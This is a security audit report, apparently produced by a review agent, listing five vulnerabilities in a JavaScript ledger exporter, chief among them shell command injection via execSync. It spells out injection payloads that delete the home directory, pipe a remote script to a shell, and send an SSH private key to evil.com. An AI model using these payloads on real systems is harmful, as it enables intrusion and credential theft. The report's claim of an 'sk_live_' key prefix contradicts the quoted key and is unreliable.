# Security Report — Ledger #001

**Reviewer:** Security Vulnerabilities Verifier (read-only)
**Scope:** Files changed by the Bug Fixer per `context/bugs/001/fix-summary.md`:
- `src/exporter.js` (read in full, 36 lines)
- `src/ledger.js` (read in full, 87 lines)

Each finding below is anchored to a `file:line` verified by reading the file. The Bug
Fixer's edits were small (a `getBalance` sign fix, an inclusive-range fix, and adding a
`Currency: USD` header line), but the review covers the full content of each changed
file, which surfaces pre-existing vulnerabilities in `src/exporter.js`.

---

## Findings

### F-1 — Command injection via `execSync` with interpolated input
- **Severity:** CRITICAL
- **Location:** `src/exporter.js:32`
- **Code:** `execSync(\`echo "${report}" > ${filename}\`);`
- **Why it is exploitable:** `exportReport(ledger, filename)` shells out with both
  `report` and `filename` interpolated directly into a command string passed to a shell.
  - `report` is built by `buildReport` from ledger contents — notably `tx.category`
    (`src/ledger.js:74`, surfaced at `src/exporter.js:20`), which is attacker-influenced
    free text that receives **no validation** in `addTransaction`
    (`src/ledger.js:16-24` only checks `amount` and `type`). A category such as
    `"; rm -rf ~ #` or `$(curl evil.sh | sh)` breaks out of the quoted `echo` and runs
    arbitrary commands. The double-quote wrapping does not protect against `$(...)`,
    backticks, or an embedded `"` that closes the quote.
  - `filename` is interpolated completely unquoted, so a value like
    `report.txt; curl -d @~/.ssh/id_rsa evil.com` executes arbitrary commands and/or
    redirects output to attacker-chosen paths.
  This is remote/arbitrary code execution on the host running the export.
- **Remediation:** Do not build a shell command. Write the file with the filesystem API
  instead of a shell:
  ```js
  const fs = require('fs');
  fs.writeFileSync(filename, report);
  ```
  If a subprocess is genuinely required, use the array form of `execFile`/`spawn` (no
  shell) and never interpolate untrusted data into a command string. Additionally,
  validate/normalize `filename` against an allowed output directory and validate
  `tx.category` at the trust boundary in `addTransaction`.

### F-2 — Hardcoded live API key (secret committed in source)
- **Severity:** HIGH
- **Location:** `src/exporter.js:6` (declared), `src/exporter.js:36` (exported)
- **Code:** `const API_KEY = 'hardcoded-demo-secret-DO-NOT-USE';`
- **Why it is exploitable:** A live-looking secret (`sk_live_` prefix mirrors a
  production payment/secret key) is committed in plaintext and re-exported from the
  module (`module.exports = { ..., API_KEY }`), widening its exposure. Anyone with read
  access to the repo, a clone, a CI artifact, or git history obtains a usable credential.
  Secrets in source control are effectively permanent — they remain recoverable in
  history even after deletion.
- **Remediation:** Remove the literal from source and load it at runtime from a secret
  store or environment variable (`process.env.API_KEY`), failing fast if unset. **Treat
  this key as compromised: rotate/revoke it immediately**, since it has been committed.
  Drop `API_KEY` from the module's public exports. Add a secret scanner (e.g.
  gitleaks) to CI to prevent recurrence.

### F-3 — No input validation of `filename` at the export trust boundary
- **Severity:** MEDIUM
- **Location:** `src/exporter.js:30-33` (`exportReport`)
- **Why it is exploitable:** Even independent of the shell-injection in F-1, `filename`
  is used as an unconstrained write destination. A caller-supplied path (e.g.
  `../../etc/...`, an absolute path, or a symlink target) allows path traversal and
  overwriting of arbitrary files the process can write. After F-1 is fixed by switching
  to `fs.writeFileSync`, this remains a path-traversal / arbitrary-overwrite risk.
- **Remediation:** Resolve `filename` against a fixed base directory with
  `path.resolve`/`path.normalize` and reject any result that escapes the intended
  directory; reject absolute paths and `..` segments. Consider restricting the allowed
  extension.

### F-4 — Unvalidated `category` field stored and propagated
- **Severity:** LOW
- **Location:** `src/ledger.js:16-24` (`addTransaction`), consumed at
  `src/ledger.js:74` (`summarizeByCategory`) and `src/exporter.js:19-20`
- **Why it is relevant:** `addTransaction` validates only `amount` and `type`; `category`
  (and `id`, `date`) are accepted as-is. This is the untrusted data that feeds the
  injection sink in F-1 and would also be the vector for output injection in any future
  HTML/CSV/log consumer of the report. On its own (without the F-1 sink) it is a
  data-hygiene / defense-in-depth gap rather than a directly exploitable flaw.
- **Remediation:** Validate `category` (and `date` format, `id` type) at the boundary —
  enforce a type, length cap, and an allow-list/charset for `category`. This narrows the
  blast radius of any downstream sink.

### F-5 — Informational: `getTransactionsInRange` relies on lexicographic string compare
- **Severity:** INFO
- **Location:** `src/ledger.js:62-64`
- **Why it is noted:** The inclusive range filter compares `tx.date` strings
  lexicographically. This is correct **only** for well-formed, zero-padded ISO
  `YYYY-MM-DD` values. Since `date` is not validated on input (see F-4), malformed dates
  silently produce wrong results. Not a security vulnerability (no injection, no
  privilege/secret exposure) — recorded for correctness/robustness awareness.
- **Remediation:** Validate the `date` format on input, or compare parsed date values.

---

## Severity Summary

| Severity  | Count | Findings                                |
|-----------|-------|-----------------------------------------|
| CRITICAL  | 1     | F-1 (command injection)                 |
| HIGH      | 1     | F-2 (hardcoded API key)                 |
| MEDIUM    | 1     | F-3 (filename / path traversal)         |
| LOW       | 1     | F-4 (unvalidated `category`)            |
| INFO      | 1     | F-5 (lexicographic date compare)        |
| **Total** | **5** |                                         |

**Top priority:** F-1 (CRITICAL) and F-2 (HIGH) in `src/exporter.js` — both are directly
exploitable: F-1 yields arbitrary command execution from attacker-controlled ledger data
or filename, and F-2 leaks a live credential that must be rotated now. `src/ledger.js`
contains no injection sinks or secrets; its findings are validation/robustness gaps.
